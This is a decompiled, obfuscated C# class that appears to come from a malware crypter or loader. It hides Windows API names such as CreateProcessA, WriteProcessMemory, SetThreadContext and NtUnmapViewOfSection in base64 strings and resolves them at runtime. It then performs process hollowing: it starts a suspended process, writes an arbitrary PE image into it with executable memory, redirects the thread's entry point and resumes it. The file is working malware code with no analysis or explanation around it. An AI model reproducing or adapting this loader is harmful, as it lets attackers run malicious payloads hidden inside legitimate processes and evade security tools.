using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using hU4x3GePSuIEn9q1kR;
using ns0;

namespace ns1;

public class GClass0
{
	private delegate IntPtr Delegate0(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	private delegate bool Delegate1(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, uint uint_0, ref uint uint_1);

	private delegate bool Delegate2(string string_0, StringBuilder stringBuilder_0, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_1, byte[] byte_0, IntPtr[] intptr_3);

	private delegate bool Delegate3(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, ref int int_0);

	private delegate bool Delegate4(IntPtr intptr_0, uint[] uint_0);

	private delegate bool Delegate5(IntPtr intptr_0, uint[] uint_0);

	private delegate uint Delegate6(IntPtr intptr_0, IntPtr intptr_1);

	private delegate bool Delegate7(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, int int_0, ref IntPtr intptr_3);

	private delegate uint Delegate8(IntPtr intptr_0);

	public GClass0()
	{
		Rul53eN1pQAkHhMgbS.OSEpUTCzh4CrB();
		base._002Ector();
	}

	[DllImport("C:\\WINDOWS\\SYSTEM32\\KERNEL32.DLL")]
	private static extern IntPtr LoadLibraryA(string string_0);

	[DllImport("C:\\WINDOWS\\SYSTEM32\\KERNEL32.DLL")]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(string_0), string_1), typeof(T));
	}

	private static string smethod_1(string string_0)
	{
		return Encoding.ASCII.GetString(Convert.FromBase64String(string_0));
	}

	public static bool smethod_2(byte[] byte_0, string string_0)
	{
		_ = 2894;
		string string_ = "a2VybmVsMzI=";
		string string_2 = "VmlydHVhbEFsbG9jRXg=";
		Delegate0 @delegate = smethod_0<Delegate0>(smethod_1(Class43.smethod_0("", string_, "")), smethod_1(string_2));
		string string_3 = "VmlydHVhbFByb3RlY3RFeA==";
		smethod_0<Delegate1>(smethod_1(Class43.smethod_0("", string_, "")), smethod_1(string_3));
		string string_4 = "Q3JlYXRlUHJvY2Vzc0E=";
		Delegate2 delegate2 = smethod_0<Delegate2>(smethod_1(Class43.smethod_0("", string_, "")), smethod_1(string_4));
		string string_5 = "V3JpdGVQcm9jZXNzTWVtb3J5";
		Delegate3 delegate3 = smethod_0<Delegate3>(smethod_1(Class43.smethod_0("", string_, "")), smethod_1(string_5));
		string string_6 = "R2V0VGhyZWFkQ29udGV4dA==";
		Delegate4 delegate4 = smethod_0<Delegate4>(smethod_1(Class43.smethod_0("", string_, "")), smethod_1(string_6));
		string string_7 = "U2V0VGhyZWFkQ29udGV4dA==";
		Delegate5 delegate5 = smethod_0<Delegate5>(smethod_1(Class43.smethod_0("", string_, "")), smethod_1(string_7));
		string string_8 = "TnRVbm1hcFZpZXdPZlNlY3Rpb24=";
		string string_9 = "bnRkbGw=";
		smethod_0<Delegate6>(smethod_1(string_9), smethod_1(string_8));
		string string_10 = "UmVhZFByb2Nlc3NNZW1vcnk=";
		Delegate7 delegate6 = smethod_0<Delegate7>(smethod_1(Class43.smethod_0("", string_, "")), smethod_1(string_10));
		string string_11 = "UmVzdW1lVGhyZWFk";
		Delegate8 delegate7 = smethod_0<Delegate8>(smethod_1(Class43.smethod_0("", string_, "")), smethod_1(string_11));
		_ = 8948;
		checked
		{
			try
			{
				_ = 38948;
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = Class18.smethod_0(4);
				byte[] byte_ = Class14.smethod_0(68);
				int num = BitConverter.ToInt32(byte_0, 60);
				int num2 = BitConverter.ToInt16(byte_0, num + 6);
				IntPtr intptr_ = new IntPtr(BitConverter.ToInt32(byte_0, num + 84));
				if (delegate2(null, new StringBuilder(string_0), zero, zero, bool_0: false, 4, zero, null, byte_, array))
				{
					uint[] array2 = Class36.smethod_0(179);
					array2[0] = 65538u;
					if (delegate4(array[1], array2))
					{
						IntPtr intptr_2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr intPtr = new IntPtr(4);
						IntPtr intptr_3 = array[0];
						IntPtr intptr_4 = Class42.smethod_0(0);
						IntPtr intptr_5 = Class42.smethod_0(0);
						if (delegate6(intptr_3, intptr_2, ref intptr_4, 4, ref intptr_5))
						{
							IntPtr intPtr2 = @delegate(intptr_1: new IntPtr(BitConverter.ToInt32(byte_0, num + 52)), intptr_2: new IntPtr(BitConverter.ToInt32(byte_0, num + 80)), intptr_0: array[0], int_0: 12288, int_1: 64);
							int int_ = default(int);
							delegate3(array[0], intPtr2, byte_0, (uint)Class25.smethod_0(intptr_), ref int_);
							int num3 = num2 - 1;
							int num4 = num3;
							IntPtr intptr_8;
							for (int i = 0; i <= num4; i++)
							{
								int[] array3 = Class33.smethod_0(10);
								Buffer.BlockCopy(byte_0, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = Class14.smethod_0(array3[4] - 1 + 1);
								Buffer.BlockCopy(byte_0, array3[5], array4, 0, (int)unchecked((nint)(nuint)Class39.smethod_0(array4)));
								intptr_8 = smethod_3(intPtr2, array3[3]);
								delegate3(uint_0: (uint)Class25.smethod_0(new IntPtr((int)unchecked((nint)(nuint)Class39.smethod_0(array4)))), intptr_0: array[0], intptr_1: intptr_8, byte_0: array4, int_0: ref int_);
							}
							intptr_8 = new IntPtr(unchecked((long)array2[41]) + 8L);
							intptr_5 = new IntPtr(4);
							intptr_4 = intptr_5;
							IntPtr intptr_9 = Class42.smethod_0(Convert.ToInt32(intptr_4.ToInt64()));
							delegate3(array[0], intptr_8, BitConverter.GetBytes(intPtr2.ToInt32()), (uint)Class25.smethod_0(intptr_9), ref int_);
							array2[44] = (uint)(intPtr2.ToInt32() + BitConverter.ToInt32(byte_0, num + 40));
							delegate5(array[1], array2);
						}
					}
					delegate7(array[1]);
				}
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private static IntPtr smethod_3(IntPtr intptr_0, int int_0)
	{
		return new IntPtr(checked(intptr_0.ToInt32() + Convert.ToInt32(Convert.ToInt32(int_0))));
	}
}
